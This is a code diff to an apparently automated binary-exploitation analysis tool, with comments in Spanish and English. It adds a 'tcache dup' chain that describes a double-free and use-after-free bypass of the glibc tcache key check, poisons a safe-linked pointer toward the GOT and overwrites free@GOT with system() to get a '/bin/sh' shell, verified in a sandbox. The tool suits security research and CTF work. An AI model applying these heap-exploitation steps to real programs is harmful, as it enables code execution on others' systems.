@@ -190,7 +190,7 @@ def _facts(binary: str, reg=None) -> dict:
     f = {"canary": None, "pie": None, "nx": None, "arch": "x86_64",
          "win": None, "system": None, "binsh": None, "rip_offset": None,
          "puts": False, "leak_fn": None, "reenter": False, "heap_shell_ok": False,
-         "wow_ok": False, "printf": False, "uaf_fnptr_ok": False}
+         "wow_ok": False, "printf": False, "uaf_fnptr_ok": False, "tcache_dup_ok": False}
     try:
         import json
         import re as _re
@@ -272,6 +272,15 @@ def _facts(binary: str, reg=None) -> dict:
     try:
         from .autouaf import _uaf_applicable
         f["uaf_fnptr_ok"] = _uaf_applicable(binary)
+    except Exception:
+        pass
+    # aplicabilidad del driver tcache dup (double-free + UAF write -> GOT alineada a 16
+    # bytes = system(), sin __free_hook/__malloc_hook para glibc >= 2.34): reutiliza el
+    # chequeo barato de autotcachedup.py (malloc + free, sin win() -- si hay win(), las
+    # tecnicas mas directas heap_shell_ok/uaf_fnptr_ok ya cubren el caso).
+    try:
+        from .autotcachedup import _tcache_dup_applicable
+        f["tcache_dup_ok"] = _tcache_dup_applicable(binary)
     except Exception:
         pass
     return f
@@ -751,6 +760,44 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
             c.sim_result, c.verified, c.proof = _verify_chain(binary, "uaf_fnptr", f, lang)
         chains.append(c)
 
+    # 10) tcache dup (double-free + UAF write) -> GOT alineada a 16 bytes = system(): para
+    # glibc >= 2.34 sin __free_hook/__malloc_hook y sin win()/system() en el binario. La unica
+    # defensa activa es el campo `key` aleatorizado de tcache (deteccion de double-free), y con
+    # una escritura UAF basta con corromperlo con cualquier valor para saltarsela -- no hace
+    # falta adivinarlo. La unica comprobacion real que queda al popear la direccion envenenada
+    # es que este alineada a 16 bytes (no que el contenido en direccion-8 parezca un tamano de
+    # chunk valido). system() se resuelve desde la libc local del proceso (sandbox controlado).
+    if f.get("tcache_dup_ok"):
+        c = ExploitChain(name="tcache dup", target="free@GOT = system()")
+        c.requirements = [
+            _req(True, "simbolos malloc + free, sin win() (si lo hay, hay tecnicas mas directas)",
+                 "malloc + free symbols, no win() (if present, more direct techniques apply)", lang),
+            _req(True, "free() no comprueba double-free antes de una escritura UAF que pueda corromper `key`",
+                 "free() has no double-free check that a UAF write can't defeat by corrupting `key`", lang)]
+        c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)
+        c.steps = [
+            ChainStep("vuln", L("Double-free + escritura UAF", "Double-free + UAF write"),
+                      L("free() no anula el puntero; un edit posterior escribe en el chunk ya liberado",
+                        "free() does not null the pointer; a later edit writes into the already-freed chunk")),
+            ChainStep("primitive", L("Tcache dup (bypass del campo key)", "Tcache dup (key field bypass)"),
+                      L("se corrompe `key` (no hace falta conocer su valor real) para pasar la "
+                        "comprobacion de double-free, y se envenena `next` (safe-linking, "
+                        "calculable sin fuga con ASLR desactivado) hacia una GOT alineada a 16 bytes",
+                        "corrupt `key` (its real value is irrelevant) to pass the double-free "
+                        "check, and poison `next` (safe-linking, computable without a leak since "
+                        "ASLR is off) toward a 16-byte-aligned GOT entry")),
+            ChainStep("target", "free@GOT = system()",
+                      L("la siguiente reserva devuelve la propia entrada GOT de free y escribe "
+                        "system() ahi; el binario llama a free() sobre una nota con contenido "
+                        "'/bin/sh', ejecutando system('/bin/sh')",
+                        "the next allocation returns free's own GOT entry and writes system() "
+                        "there; the binary's own free() call on a '/bin/sh'-content note runs "
+                        "system('/bin/sh')"))]
+        _score(c)
+        if verify and _should_attempt_verify(c, f):
+            c.sim_result, c.verified, c.proof = _verify_chain(binary, "tcache_dup", f, lang)
+        chains.append(c)
+
     # sim_result por defecto (bilingue) para las no simuladas
     for ch in chains:
         if ch.sim_result == "no simulada":
@@ -894,6 +941,22 @@ def _verify_chain(binary: str, kind: str, facts: dict, lang: str):
             if m:
                 proof["size"] = int(m.group(1))
             return ((f"{OK} (UAF: puntero a funcion reciclado con win(), shell en sandbox)" if v
+                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
+        if kind == "tcache_dup":
+            from .autotcachedup import autotcachedup_shell
+            r = autotcachedup_shell(binary)
+            v = bool(r.get("verified"))
+            detail = r.get("detail", "") or ""
+            proof = {"strategy": "tcache dup GOT=system", "marker": "BINORACLE_PWNED",
+                     "output": (r.get("output", "") or "")[-300:]}
+            m = _re_cv.search(r"got=(\w+)\((0x[0-9a-fA-F]+)\)", detail)
+            if m:
+                proof["got_symbol"] = m.group(1)
+                proof["got"] = m.group(2)
+            m = _re_cv.search(r"system=(0x[0-9a-fA-F]+)", detail)
+            if m:
+                proof["system"] = m.group(1)
+            return ((f"{OK} (tcache dup: GOT sobrescrito con system, shell en sandbox)" if v
                      else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
         if kind == "ret2libc_leak":
             from .autolibc import autolibc
